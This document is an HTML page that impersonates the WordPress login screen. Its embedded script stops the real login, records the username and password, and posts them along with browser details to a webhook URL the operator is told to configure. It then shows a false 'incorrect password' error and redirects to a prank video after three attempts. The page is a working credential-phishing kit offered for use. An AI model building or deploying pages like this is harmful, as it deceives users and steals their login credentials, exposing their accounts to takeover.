<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In &lsaquo; WordPress</title>
    <style>
        * { box-sizing: border-box; }
        body {
            background: #f1f1f1;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
            margin: 0;
            padding: 0;
        }
        .login {
            width: 100%;
            max-width: 320px;
            margin: 8% auto;
            padding: 20px;
        }
        .login h1 {
            text-align: center;
            margin-bottom: 24px;
        }
        .login h1 a {
            display: block;
            width: 84px;
            height: 84px;
            margin: 0 auto;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 122.5 122.5"><circle cx="61.25" cy="61.25" r="61.25" fill="%232271b1"/><path d="M61.25 9.19A52.06 52.06 0 1 0 113.31 61.25 52.06 52.06 0 0 0 61.25 9.19zm-4.89 93.63L30.7 36.36h12.55l16.94 45.2 14.69-45.2h12.55L61.25 102.82z" fill="%23fff"/></svg>') no-repeat center;
            background-size: 84px;
            text-indent: -9999px;
        }
        #loginform {
            background: #fff;
            border: 1px solid #c3c4c7;
            border-radius: 4px;
            padding: 26px 24px;
            box-shadow: 0 1px 3px rgba(0,0,0,.04);
        }
        .login label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 3px;
            color: #1e1e1e;
        }
        .login input[type="text"],
        .login input[type="password"] {
            width: 100%;
            padding: 3px 5px;
            font-size: 24px;
            line-height: 1.3;
            border: 1px solid #8c8f94;
            border-radius: 4px;
            margin-bottom: 16px;
        }
        .login input[type="text"]:focus,
        .login input[type="password"]:focus {
            border-color: #2271b1;
            box-shadow: 0 0 0 1px #2271b1;
            outline: none;
        }
        .forgetmenot {
            margin-bottom: 16px;
        }
        .forgetmenot label {
            font-weight: 400;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        #wp-submit {
            background: #2271b1;
            border: 1px solid #2271b1;
            color: #fff;
            padding: 0 12px;
            height: 36px;
            font-size: 13px;
            font-weight: 600;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
        #wp-submit:hover {
            background: #135e96;
            border-color: #135e96;
        }
        .login-error {
            background: #d63638;
            color: #fff;
            padding: 12px;
            margin-bottom: 16px;
            border-radius: 4px;
            display: none;
        }
        .login-error.show {
            display: block;
        }
        #backtoblog {
            text-align: center;
            margin-top: 16px;
        }
        #backtoblog a {
            color: #50575e;
            text-decoration: none;
            font-size: 13px;
        }
        #backtoblog a:hover {
            color: #2271b1;
        }
    </style>
</head>
<body>
    <div class="login">
        <h1><a href="https://wordpress.org/">Powered by WordPress</a></h1>
        <div class="login-error" id="error">
            <strong>Error:</strong> The username or password you entered is incorrect.
        </div>
        <form id="loginform" action="#" method="post">
            <p>
                <label for="user_login">Username or Email Address</label>
                <input type="text" name="log" id="user_login" autocomplete="username" required>
            </p>
            <p>
                <label for="user_pass">Password</label>
                <input type="password" name="pwd" id="user_pass" autocomplete="current-password" required>
            </p>
            <p class="forgetmenot">
                <label>
                    <input type="checkbox" name="rememberme" id="rememberme" value="forever">
                    Remember Me
                </label>
            </p>
            <p>
                <input type="submit" name="wp-submit" id="wp-submit" value="Log In">
            </p>
        </form>
        <p id="backtoblog"><a href="/">&larr; Go to site</a></p>
    </div>

    <script>
        (function() {
            var attempts = parseInt(sessionStorage.getItem('wp_attempts') || '0');
            var form = document.getElementById('loginform');
            var error = document.getElementById('error');

            // CONFIGURE: Set your webhook URL here to capture credentials
            // Free options: webhook.site, requestbin.com, pipedream.com
            var WEBHOOK_URL = '';  // e.g., 'https://webhook.site/your-unique-id'

            form.addEventListener('submit', function(e) {
                e.preventDefault();

                var username = document.getElementById('user_login').value;
                var password = document.getElementById('user_pass').value;
                var timestamp = new Date().toISOString();

                // Log to console (visible in browser dev tools)
                console.log('Captured:', { username: username, password: password, time: timestamp });

                // Send to webhook if configured
                if (WEBHOOK_URL) {
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: username,
                            password: password,
                            timestamp: timestamp,
                            userAgent: navigator.userAgent,
                            referrer: document.referrer,
                            url: window.location.href
                        })
                    }).catch(function() {});
                }

                attempts++;
                sessionStorage.setItem('wp_attempts', attempts.toString());

                if (attempts >= 3) {
                    // Rickroll time
                    window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
                } else {
                    // Show error and reset form
                    error.classList.add('show');
                    document.getElementById('user_pass').value = '';
                    document.getElementById('user_pass').focus();
                }
            });
        })();
    </script>
</body>
</html>
